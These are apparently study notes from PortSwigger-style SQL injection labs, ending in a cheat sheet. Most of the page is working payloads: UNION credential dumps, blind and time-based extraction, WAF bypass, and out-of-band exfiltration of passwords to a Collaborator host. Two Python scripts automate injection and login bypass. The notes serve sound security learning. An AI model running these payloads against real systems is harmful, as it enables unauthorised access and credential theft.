# SQL Injection

* SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database&#x20;

### Impact of successful SQL Injection attack

* unauthorised access to sensitive data, such as passwords, credit card details, or personal user information

### How to Detect

* Burp Suite's [web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner).
* Manual Testing against entry point
  * Looking for Errors and anomalies with `'`
  * Looking for systematic difference in response with `SQL-specific syntax`
  * Looking for differences in response with `OR 1=1` and `OR 1=2`
  * Difference in time to respond with time delay payloads
  * Out of band network interaction with OAST payload

### SQL injection Query

\#webhacking #SQL

* `WHERE` clause of `SELECT` query
* In `UPDATE` statements, within the updated values or the `WHERE` clause.
* In `INSERT` statements, within the inserted values.
* In `SELECT` statements, within the table or column name.
* In `SELECT` statements, within the `ORDER BY` clause.

### SQL injection Eg:

* Retrieving hidden data - returning additional after modifying Query
* Subverting application logic - interfere with app logic
* Union Attacks - get database tables
* Blind SQL injection - no return but can control

## 1. Retrieving Hidden data

* Target https://insecure-website.com/products?category=Gifts
* Injection

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

* An attack https://insecure-website.com/products?category=Gifts'--
* injection

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

* `--` is a comment indicator: the rest of the query is interpreted as a comment — can display unreleased products.
* An attack https://insecure-website.com/products?category=Gifts'+OR+1=1--
* injection

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

* Display all items in category since 1=1 is always true. Note: UPDATE or DELETE injection can erase data.

***

#### Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

{% stepper %}
{% step %}
### Context / Vulnerability

* SQL injection on product category filter.
*   Example vulnerable query:

    ```
    SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
    ```
* Caused an internal error which proves it's vulnerable.

### End goal

* Display all products, both released and unreleased.
{% endstep %}

{% step %}
### Analysis & Attempts

*   Using an empty category string returned results:

    ```
    SELECT * FROM products WHERE category = ''
    ```
*   First payload (didn't work as-is):

    ```
    SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
    ```
*   Second payload that worked by matching the application's expected formatting:

    ```
    SELECT * FROM products WHERE category = '' OR 1=1-- 
    ```

    (or URL-encoded equivalent)
{% endstep %}

{% step %}
### Payload examples (URL)

* https://insecure-website.com/filter?category=

Examples:

* `'?category=' + "'--"`
* `'?category=' + "' OR 1=1--"`
{% endstep %}

{% step %}
### Optional script (automation)

```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "Cat Grin" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s %3Curl%3E <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")
```
{% endstep %}
{% endstepper %}

***

## 2. Subverting application logic

Example login query:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

* Attack:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

* This removes the password check using SQL comment `--` and allows login as any user.

***

#### Lab2 : SQL injection vulnerability allowing login bypass

{% stepper %}
{% step %}
### Context / Vulnerability

* SQL injection against login form.
*   Vulnerable query example:

    ```
    SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
    ```

### End goal

* Login as an administrator.
{% endstep %}

{% step %}
### Analysis / Method

* Login as a normal user, intercept the authentication request (e.g., with Burp).
* Replace the username value with the payload `administrator'--` and forward the request.
{% endstep %}

{% step %}
### Payload

* `administrator'--`
{% endstep %}

{% step %}
### Optional script (automation)

```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf,
            "username": payload,
            "password": "randomtext"}

    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])

    s = requests.Session()

    if exploit_sqli(s, url, sqli_payload):
        print('[+] SQL injection successful! We have logged in as the administrator user.')
    else:
        print('[-] SQL injection unsuccessful.')
```

Run as:

```
python3 script.py "url" "payload"
```
{% endstep %}
{% endstepper %}

***

## 3. Retrieving data from other database tables (UNION attacks)

* Example original query:

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

* Attack example:

```sql
' UNION SELECT username, password FROM users--
```

* UNION appends results from another SELECT. Requirements:
  * Same number of columns in each SELECT.
  * Compatible data types per column.

Determining number of columns:

*   Use ORDER BY incrementally until an error:

    ```
    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--
    ```
*   Or use UNION SELECT NULL progressively:

    ```
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT NULL,NULL,NULL--
    ```

***

#### Lab: SQL injection UNION attack — determine number of columns

{% stepper %}
{% step %}
### Context

* SQL injection on product category filter.
* Use `ORDER BY` and `UNION SELECT NULL,...` to find number of columns.
{% endstep %}

{% step %}
### Example observations

* `' ORDER BY 4--` caused an internal error.
* `' UNION SELECT NULL,NULL,NULL--` returned 200.
* Indicates the original query may have 4 columns.
{% endstep %}

{% step %}
### End goal

* Return an additional row containing provided values.
{% endstep %}

{% step %}
### Example payloads

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

And then test `' UNION SELECT NULL,'çyber',NULL--` to find which column accepts strings.
{% endstep %}
{% endstepper %}

***

#### Lab: Finding columns with a useful data type for UNION

{% stepper %}
{% step %}
### Context

* Using UNION SELECT NULL,... and replacing NULL with strings to find which column outputs text.
{% endstep %}

{% step %}
### Method

*   Try:

    ```
    ' UNION SELECT 'a',NULL,NULL,NULL--
    ' UNION SELECT NULL,'a',NULL,NULL--
    ' UNION SELECT NULL,NULL,'a',NULL--
    ' UNION SELECT NULL,NULL,NULL,'a'--
    ```
* When injection returns the string in the response, that column is compatible with strings.
{% endstep %}

{% step %}
### Example working payload

```
' UNION SELECT NULL,'joy',NULL--
```
{% endstep %}
{% endstepper %}

***

#### Lab: Using UNION to retrieve usernames and passwords

{% stepper %}
{% step %}
### Context

* Need to find a table `users` with columns `username` and `password`.
* First determine number of columns and which support strings.
{% endstep %}

{% step %}
### Example observations

* `' ORDER BY 3--` indicated two columns.
* `' UNION SELECT 'ham',NULL--` and `' UNION SELECT NULL,'ham'--` returned 200 — both columns accept strings.
*   Retrieve credentials:

    ```
    ' UNION SELECT username, password FROM users--
    ```
* Example retrieved admin password: `administrator: 6fcym2ar70ag8nnqx0mi`
{% endstep %}

{% step %}
### End goal

* Retrieve all usernames and passwords and log in as administrator.
{% endstep %}
{% endstepper %}

***

### Examining the database in SQL injection

* Determine database type & version.
* Find tables and columns.

Common version queries:

* Microsoft, MySQL: `SELECT @@version`
* Oracle: `SELECT * FROM v$version`
* PostgreSQL: `SELECT version()`

Example payload:

```sql
' UNION SELECT @@version--
```

#### Labs: Querying database version (Oracle, MySQL/Microsoft)

* Oracle example payload to get version:

```sql
' UNION SELECT BANNER, NULL FROM v$version--
```

* MySQL/Microsoft example payload:

```sql
' UNION SELECT @@version, NULL#
```

***

#### Lab: Retrieving multiple values within a single column

* Combine username and password into one column (concatenation differs per DB).
* Example (PostgreSQL concatenation shown):

```sql
' UNION SELECT NULL,username||'~'||password FROM users--
```

***

### Listing the contents of the database

* Common (non-Oracle) tables:

```sql
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

* Oracle equivalents:

```sql
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

#### Lab: Listing database contents (non-Oracle and Oracle examples)

{% stepper %}
{% step %}
### Non-Oracle (example process)

* Determine vulnerability and column count.
*   Retrieve tables:

    ```
    ' UNION SELECT table_name, NULL FROM information_schema.tables--
    ```
*   Once a table with user credentials (e.g., `users_spmoml`) is found:

    ```
    ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_spmoml'--
    ' UNION SELECT username_oljdnf, password_edjeit FROM users_spmoml--
    ```
* Example admin credentials found: `administrator : 6pps6k9stu5zfytpa9hf`
{% endstep %}

{% step %}
### Oracle (example process)

*   Retrieve tables:

    ```
    ' UNION SELECT table_name,NULL FROM all_tables--
    ```
*   Retrieve columns:

    ```
    ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ASJGRU'--
    ```
*   Retrieve usernames/passwords:

    ```
    ' UNION SELECT USERNAME_QZXUUM, PASSWORD_PMRZDZ FROM USERS_ASJGRU--
    ```
* Example admin credentials found: `administrator : 6kvn3tzjc6ri9bql5yqb`
{% endstep %}
{% endstepper %}

***

## 4. Blind SQL injection Vulnerabilities

* No results returned or errors in the response.
* Can change query logic without visible output.
* Techniques:
  * Conditional responses (true/false)
  * Time delays
  * Conditional errors
  * Out-of-band (OAST) interactions (e.g., DNS lookups with Burp Collaborator)

### Exploiting Blind SQL injection by triggering conditional responses

Example:

*   App uses a tracking cookie:

    ```
    Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
    SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
    ```
*   If application shows a "Welcome back" message when the query returns a row, you can infer boolean conditions:

    ```
    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
    ```
* Repeat character-by-character to extract the password (SUBSTRING / SUBSTR differences across DBs).

#### Lab: Blind SQL injection with conditional responses

{% stepper %}
{% step %}
### Context

* Blind SQL injection via tracking cookie. Response includes "Welcome back" if query returns rows.
* Target table: `users` (columns `username`, `password`).
{% endstep %}

{% step %}
### Method (overview)

* Intercept request and modify cookie:
  * `TrackingId=xyz' AND '1'='1` → returns 200 and confirms true condition.
  * `TrackingId=xyz' AND '1'='2` → false.
* Confirm table existence:
  * `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
* Determine password length and each character using:
  * `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
* Use Burp Intruder (simple list) to iterate values a-z,0-9 and grep for the "Welcome back" response.
{% endstep %}

{% step %}
### Example payloads

```
TrackingId=xyz' AND '1'='1
TrackingId=xyz' AND '1'='2
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§
```
{% endstep %}
{% endstepper %}

***

### Error-based SQL injection

* Use database error messages to extract data.
* Induce errors or conditional errors that reveal data (turn blind into visible).

#### Exploiting blind SQL injection by triggering conditional errors (Oracle example)

* Oracle-specific technique: cause an error via division-by-zero or TO\_CHAR(1/0) in a CASE WHEN to detect true conditions via 500 error.
*   Example (inject into cookie):

    ```
    TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
    ```

    * Returns 500 when condition is true.
* Use to enumerate password length and characters via SUBSTR.

**Example payloads (Oracle / error-based)**

```
TrackingId=xyz'||(SELECT '')||
'||(SELECT '' FROM not-a-real-table)||'
'||(SELECT '' FROM users WHERE ROWNUM = 1)||
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

(Use Burp Repeater to test lengths, and Intruder to brute-force characters.)

***

#### Lab: Blind SQL injection with conditional errors (step summary)

{% stepper %}
{% step %}
### Context

* Blind SQL injection; application returns custom error when SQL causes a DB-level error.
* Database: Oracle.
{% endstep %}

{% step %}
### Method summary

* Intercept request with `TrackingId` cookie.
* Confirm error with `TrackingId=xyz'` and see error disappear with `TrackingId=xyz''`.
*   Confirm server interprets injection as SQL:

    ```
    TrackingId=xyz'||(SELECT '' FROM dual)||'
    ```
* Trigger intentional error to test boolean conditions.
* Use CASE WHEN ... TO\_CHAR(1/0) to force an error when condition is true.
* Determine length and characters of admin password using LENGTH() and SUBSTR().
{% endstep %}

{% step %}
### Example payloads

(see the payload block above for Oracle conditional error payloads)
{% endstep %}
{% endstepper %}

***

### Exploiting blind SQL injection by triggering time delays

* If DB errors are handled gracefully, use time delays to infer conditions.
*   Example (PostgreSQL):

    ```
    TrackingId=x'||pg_sleep(10)--
    ```
*   For conditional sleeps:

    ```
    TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
    ```
* Use Intruder (single-threaded / measure response time) or custom scripts to detect delays.

#### Lab: Time delay attacks & extracting info via time-based techniques

{% stepper %}
{% step %}
### Context

* Blind SQL injection where the app response does not visibly change.
* Time delays are used to infer truth of conditions.
{% endstep %}

{% step %}
### Method summary

*   Trigger unconditional delay:

    ```
    TrackingId=x'||pg_sleep(10)--
    ```
*   Conditional delay to check for username:

    ```
    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    ```
*   Determine password length and characters:

    ```
    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    ```
* Use Burp Intruder (Cluster bomb) with resource pool limiting concurrency to 1 and monitor response time.
{% endstep %}

{% step %}
### Example payloads

```
TrackingId=x'||pg_sleep(10)--
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
{% endstep %}
{% endstepper %}

***

### Exploiting blind SQL injection using out-of-band (OAST) techniques

* Use DNS/HTTP interactions to an external server you control (e.g., Burp Collaborator).
*   Technique varies by DB. Example for MS SQL Server:

    ```
    '; exec master..xp_dirtree '//SUBDOMAIN.burpcollaborator.net/a'--
    ```
* Use Collaborator to generate a unique subdomain and poll for interactions.

#### Lab: OOB interaction (DNS) & data exfiltration (Oracle example)

{% stepper %}
{% step %}
### Context

* Application runs SQL asynchronously; response doesn't change. Use OAST to trigger network interactions.
{% endstep %}

{% step %}
### Technique (Oracle example)

* Use XML external entity or EXTRACTVALUE technique to cause DB to fetch a URL/DNS name that includes exfiltrated data.
*   Example (generic Oracle XML technique — use Burp Collaborator to insert subdomain):

    ```
    TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('</?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l')+FROM+dual--
    ```
*   For data exfiltration replace part of the domain with the result of a query, e.g.:

    ```
    TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('...<!ENTITY % remote SYSTEM "http://'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">...'),'/l')+FROM+dual--
    ```
* Insert Collaborator payload via Burp (`Insert Collaborator payload`) and poll Collaborator to see interactions that include the data.
{% endstep %}
{% endstepper %}

***

### Second-order SQL injection

* First-order: input immediately used in SQL.
* Second-order: input is stored and later used unsafely.
* Example injection stored and later executed:

```sql
badguy';update users set password='letmein' where user='administrator'--
```

* Example combined:

```sql
select * from user_options where user='badguy';update users set password='letmein' where user='administrator'--
```

***

### SQL injection in different contexts

* Databases can be queried via JSON or XML inputs; encoding can be used to bypass WAFs.
* XML injection example:

```xml
<stockCheck>
  <productId>123</productId>
  <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

#### Lab: SQL injection with filter bypass via XML encoding

{% stepper %}
{% step %}
### Context

* Stock check endpoint accepts XML. WAF blocks obvious SQLi.
* Use Hackvertor (or similar) to encode payload (dec\_entities/hex\_entities) to bypass WAF.
{% endstep %}

{% step %}
### Method

* Probe the endpoint to see if storeId is evaluated.
* Determine number of columns and which to target.
* Obfuscate payload using XML entities.
* If application returns only one column, concatenate username and password into one column (DB-specific concatenation).
{% endstep %}

{% step %}
### Example payload (XML with encoded UNION)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>3</productId>
  <storeId>1<@dec_entities>UNION SELECT username || '~' || password FROM users<@/dec_entities></storeId>
</stockCheck>
```

* Use Hackvertor to encode the inner payload to bypass WAF.
{% endstep %}
{% endstepper %}

***

### Prevent SQL injection

1. Use parameterised queries (prepared statements) instead of string concatenation.

* Vulnerable code (example):

```sql
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

* Secure correction:

```sql
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

***

## SQL injection cheat sheet

Useful syntax and platform differences.

### String concatenation (examples)

* Oracle: `'foo'||'bar'`
* Microsoft: `'foo'+'bar'`
* PostgreSQL: `'foo'||'bar'`
* MySQL: `'foo' 'bar'` (space) or `CONCAT('foo','bar')`

### Substring

* Oracle: `SUBSTR('foobar', 4, 2)`
* Microsoft/PostgreSQL/MySQL: `SUBSTRING('foobar', 4, 2)`

### Comments

* Oracle: `--comment`
* Microsoft/PostgreSQL: `--comment` or `/*comment*/`
* MySQL: `#comment` or `-- comment` (note space) or `/*comment*/`

### Database Version

* Oracle: `SELECT banner FROM v$version` or `SELECT version FROM v$instance`
* Microsoft/MySQL: `SELECT @@version`
* PostgreSQL: `SELECT version()`

### Database Contents

* Oracle: `SELECT * FROM all_tables`
  * `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`
* Microsoft/PostgreSQL/MySQL: `SELECT * FROM information_schema.tables`
  * `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

### Conditional errors

*   Oracle:

    ```
    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
    ```
*   Microsoft:

    ```
    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
    ```
*   PostgreSQL:

    ```
    1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
    ```
*   MySQL:

    ```
    SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
    ```

### Extracting data via visible error messages

*   Microsoft:

    ```
    SELECT 'foo' WHERE 1 = (SELECT 'secret')
    ```

    (Conversion failed when converting the varchar value 'secret' to data type int.)
*   PostgreSQL:

    ```
    SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
    ```

    (invalid input syntax for integer: "secret")
*   MySQL:

    ```
    SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
    ```

    (XPATH syntax error)

### Batched (stacked) queries

* Oracle: does not support stacked queries.
* Microsoft/PostgreSQL/MySQL: `QUERY-1; QUERY-2;`

### Time delays (unconditional)

* Oracle: `dbms_pipe.receive_message(('a'),10)`
* Microsoft: `WAITFOR DELAY '0:0:10'`
* PostgreSQL: `SELECT pg_sleep(10)`
* MySQL: `SELECT SLEEP(10)`

### Conditional time delays

*   Oracle:

    ```
    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
    ```
*   Microsoft:

    ```
    IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
    ```
*   PostgreSQL:

    ```
    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
    ```
*   MySQL:

    ```
    SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
    ```

### DNS lookup (triggering OOB interactions)

*   Oracle (XML / EXTRACTVALUE technique — patched in many installs but still found):

    ```
    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
    ```

    (Another option if privileged: `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`)
*   Microsoft:

    ```
    exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
    ```
*   PostgreSQL:

    ```
    copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
    ```
*   MySQL (Windows only techniques):

    ```
    LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
    SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'
    ```

### DNS lookup with data exfiltration (patterns)

*   Oracle:

    ```
    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
    ```
*   Microsoft:

    ```
    declare @p varchar(1024); set @p=(SELECT YOUR-QUERY-HERE); exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
    ```
*   PostgreSQL:

    ```
    create or replace function f() returns void as $$
    declare c text; declare p text;
    begin
      SELECT into p (SELECT YOUR-QUERY-HERE);
      c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
      execute c;
    END;
    $$ language plpgsql security definer;
    SELECT f();
    ```
*   MySQL (Windows only):

    ```
    SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'
    ```

